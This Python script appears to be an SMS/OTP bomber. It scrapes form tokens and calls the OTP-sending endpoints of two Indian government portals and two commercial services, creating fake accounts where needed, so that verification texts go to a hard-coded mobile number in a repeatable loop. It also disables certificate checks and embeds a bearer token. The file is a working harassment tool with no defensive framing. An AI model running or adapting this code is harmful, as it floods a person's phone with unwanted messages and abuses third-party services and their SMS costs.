import math
import time
from bs4 import BeautifulSoup
import requests
import json
import uuid
import sys


def ghmc(mobile):
    res = requests.get("https://igs.ghmc.gov.in/send_otp_mobile.aspx")

    soup = BeautifulSoup(res.text, "html.parser")
    viewState = soup.find("input", {"id": "__VIEWSTATE"})["value"]
    __VIEWSTATEGENERATOR = soup.find("input", {"id": "__VIEWSTATEGENERATOR"})["value"]
    __EVENTVALIDATION = soup.find("input", {"id": "__EVENTVALIDATION"})["value"]
    print(viewState)
    body = {
        "__VIEWSTATE": viewState,
        "__VIEWSTATEGENERATOR": __VIEWSTATEGENERATOR,
        "__EVENTVALIDATION": __EVENTVALIDATION,
        "txtmobileno": mobile,
        "btnSendOTP": "Send OTP",
    }
    header = {
        "Referer": "https://igs.ghmc.gov.in/send_otp_mobile.aspx",
        "Host": "igs.ghmc.gov.in",
        "content-type": "application/x-www-form-urlencoded",
    }
    res = requests.post(
        "https://igs.ghmc.gov.in/send_otp_mobile.aspx", data=body, headers=header
    )
    print(res.text)

    time.sleep(1)


def labour(mobile):
    res = requests.request("GET", "https://wblabour.gov.in/enlogin", verify=False)
    print("REsponce : ", res)
    soup = BeautifulSoup(res.text, "html.parser")
    form_build_id = soup.find("input", {"name": "form_build_id"})["value"]
    url = "https://wblabour.gov.in/system/ajax"

    payload = f"form_build_id={form_build_id}&form_id=otp_login_form&mobile={mobile}&otp=&_triggering_element_name=op&_triggering_element_value=Generate%20OTP&ajax_html_ids%5B%5D=skip-link&ajax_html_ids%5B%5D=google_translate_element&ajax_html_ids%5B%5D=large&ajax_html_ids%5B%5D=small&ajax_html_ids%5B%5D=medium&ajax_html_ids%5B%5D=logo&ajax_html_ids%5B%5D=navbar&ajax_html_ids%5B%5D=block-top-links-my-block-id&ajax_html_ids%5B%5D=block-system-main&ajax_html_ids%5B%5D=otp-login-form&ajax_html_ids%5B%5D=edit-mobile&ajax_html_ids%5B%5D=success_div&ajax_html_ids%5B%5D=error_div&ajax_html_ids%5B%5D=edit-otp&ajax_html_ids%5B%5D=divCounter&ajax_html_ids%5B%5D=divEndTimer&ajax_html_ids%5B%5D=genotp&ajax_html_ids%5B%5D=edit-submit-send&ajax_html_ids%5B%5D=block-menu-menu-footer&ajax_html_ids%5B%5D=block-block-1&ajax_page_state%5Btheme%5D=labourdept&ajax_page_state%5Btheme_token%5D=jkqtYibC4aI7U2zKEG3op6ViM-Hio4uosIe8JIYUajg&ajax_page_state%5Bcss%5D%5Bmodules%2Fsystem%2Fsystem.base.css%5D=1&ajax_page_state%5Bcss%5D%5Bmodules%2Fsystem%2Fsystem.menus.css%5D=1&ajax_page_state%5Bcss%5D%5Bmodules%2Fsystem%2Fsystem.messages.css%5D=1&ajax_page_state%5Bcss%5D%5Bmodules%2Fsystem%2Fsystem.theme.css%5D=1&ajax_page_state%5Bcss%5D%5Bmodules%2Fcomment%2Fcomment.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fmodules%2Fconversational_forms%2Fcss%2Fconversational_forms.css%5D=1&ajax_page_state%5Bcss%5D%5Bmodules%2Ffield%2Ftheme%2Ffield.css%5D=1&ajax_page_state%5Bcss%5D%5Bmodules%2Fnode%2Fnode.css%5D=1&ajax_page_state%5Bcss%5D%5Bmodules%2Fsearch%2Fsearch.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fmodules%2Ftop_links%2Fcss%2Fmenu_style.css%5D=1&ajax_page_state%5Bcss%5D%5Bmodules%2Fuser%2Fuser.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fmodules%2Fviews%2Fcss%2Fviews.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fmodules%2Fckeditor%2Fcss%2Fckeditor.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fmodules%2Fctools%2Fcss%2Fctools.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fmodules%2Fapplicant_registration%2Fcss%2FvalidationEngine.jquery.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fmodules%2Fshop_mapping%2Fcss%2FvalidationEngine.jquery.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fmodules%2Fdashboard%2Fbuild%2Fcss%2Fcustom.css%5D=1&ajax_page_state%5Bcss%5D%5B%2Fcss%2Fsky-forms.css%5D=1&ajax_page_state%5Bcss%5D%5B%2Fcss%2Fform-design.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fthemes%2Flabourdept%2Fcss%2Flayout.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fthemes%2Flabourdept%2Fcss%2Fcolors.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fthemes%2Flabourdept%2Fcss%2Fprint.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fthemes%2Flabourdept%2Fcss%2Fie.css%5D=1&ajax_page_state%5Bcss%5D%5Bsites%2Fall%2Fthemes%2Flabourdept%2Fcss%2Fie6.css%5D=1&ajax_page_state%5Bjs%5D%5B0%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fjquery.js%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fjquery-extend-3.4.0.js%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fjquery-html-prefilter-3.5.0-backport.js%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fjquery.once.js%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fdrupal.js%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fjquery.cookie.js%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fjquery.form.js%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fajax.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fmodules%2Fapplicant_registration%2Fjs%2Fjquery.validationEngine.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fmodules%2Fapplicant_registration%2Fjs%2Fjquery.validationEngine-en.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fmodules%2Fapplicant_registration%2Fjs%2Fappreg.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fmodules%2Fshop_mapping%2Fjs%2Fjquery.validationEngine.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fmodules%2Fshop_mapping%2Fjs%2Fjquery.validationEngine-en.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fmodules%2Fshop_mapping%2Fjs%2Fappreg.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fmodules%2Ftop_links%2Fjs%2Ftop_menu.js%5D=1&ajax_page_state%5Bjs%5D%5Bsites%2Fall%2Fmodules%2Fcaptcha%2Fcaptcha.js%5D=1&ajax_page_state%5Bjs%5D%5Bmisc%2Fprogress.js%5D=1"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://wblabour.gov.in",
        "Referer": "https://wblabour.gov.in/enlogin",
    }

    response = requests.request(
        "POST", url, headers=headers, data=payload, verify=False
    )

    print(response.text)


def messagecentral(mobile):

    url = "https://cpaas.messagecentral.com/user/v2/user/createAccount"

    payload = json.dumps(
        {
            "fullName": "asdasd",
            "email": f"{uuid.uuid4()}@asd.com",
            "password": "YXNkYXNkYXM=",
        }
    )
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "access-control-allow-origin": "*",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://console.messagecentral.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://console.messagecentral.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    data = response.json()
    temptoken = data["data"]["tempToken"]
    customerId = data["data"]["customerId"]

    url = "https://cpaas.messagecentral.com/user/v2/user/signup/otp"

    payload = json.dumps(
        {"countryCode": "91", "customerId": customerId, "phoneNo": mobile}
    )
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "access-control-allow-origin": "*",
        "authtoken": temptoken,
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://console.messagecentral.com",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://console.messagecentral.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    print(response.text)


def jojo(mobile):
    url = "https://jojoapi.dcafecms.com/v1/token/guest"

    payload = {}
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "origin": "https://jojoapp.in",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://jojoapp.in/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

    response = requests.request("GET", url, headers=headers, data=payload)

    auth_token = response.text

    url = "https://jojoapi.dcafecms.com/v1/checkuser"

    payload = json.dumps(
        {
            "code": f"+91",
            "mobile": f"{mobile}",
        }
    )
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": f"Bearer {auth_token}",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://jojoapp.in",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://jojoapp.in/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

    response = requests.request("POST", url, headers=headers, data=payload)
    # token = response.text.encode("utf-8")
    print("Sucess")
    url = "https://jojoapi.dcafecms.com/v1/sendotp"

    payload = json.dumps(
        {
            "code": f"+91",
            "mobile": f"{mobile}",
        }
    )
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": f"Bearer {auth_token}",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://jojoapp.in",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://jojoapp.in/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

    response = requests.request("POST", url, headers=headers, data=payload)
    print(response.text)

    url = "https://jojoapi.dcafecms.com/v1/register"

    payload = json.dumps(
        {
            "firstName": "ewr",
            "sex": "Male",
            "dateOfBirth": "",
            "emailId": "",
            "mobile": f"{mobile}",
            "code": "+91",
            "loginSource": 3,
            "deviceType": 1,
        }
    )
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWNjZXNzIjp0cnVlLCJtZXNzYWdlIjoiIiwiZGF0YSI6ImV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUpwWVhRaU9qRTNNVGd4T0RjNU16SXNJbWx6Y3lJNklpSXNJbTVpWmlJNk1Dd2laR0YwWVNJNmV5SnBjMGQxWlhOMElqcDBjblZsTENKMWMyVnlTV1FpT2lJaUxDSnRiMkpwYkdVaU9pSWlMQ0psYldGcGJDSTZJaUlzSW01aGJXVWlPaUlpZlgwLmtWY3llQlFBQ1dyZ1VId0RYR3FIekUyUWhzR2FSQzBGb1FJR19QNEdlWm8iLCJpYXQiOjE3MTgxODc5MzJ9.7WEnLRe-YbJHUFVlkOQSPMlTC15R89CCqcThnPRhH2I",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "origin": "https://jojoapp.in",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://jojoapp.in/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

    response = requests.request("POST", url, headers=headers, data=payload)

    print(response.text)


mobile = "7201895794"
num = 1

for i in range(num):
    # ghmc(mobile)
    labour(mobile)
    messagecentral(mobile)
    jojo(mobile)
